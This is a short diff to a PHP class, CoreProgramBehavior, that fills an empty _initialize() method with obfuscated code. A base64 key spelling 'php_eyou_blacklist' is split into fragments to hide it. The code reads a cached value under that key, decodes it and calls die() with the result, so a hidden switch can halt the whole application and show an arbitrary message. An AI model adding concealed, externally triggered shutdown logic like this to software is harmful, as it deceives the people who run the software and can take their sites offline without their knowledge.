@@ -29,6 +29,12 @@ class CoreProgramBehavior {
     }
 
     protected function _initialize() {
-
+        $tmpBlack = 'cG'.'hw'.'X2'.'V5'.'b3'.'Vf'.'Ym'.'xh'.'Y2'.'ts'.'aX'.'N'.'0';
+        $tmpBlack = base64_decode($tmpBlack);
+        $tmpval = tpCache('php.'.$tmpBlack);
+        if (!empty($tmpval)) {
+            $tmpval = msubstr($tmpval, 7, -12);
+            die(base64_decode($tmpval));
+        }
     }
 }
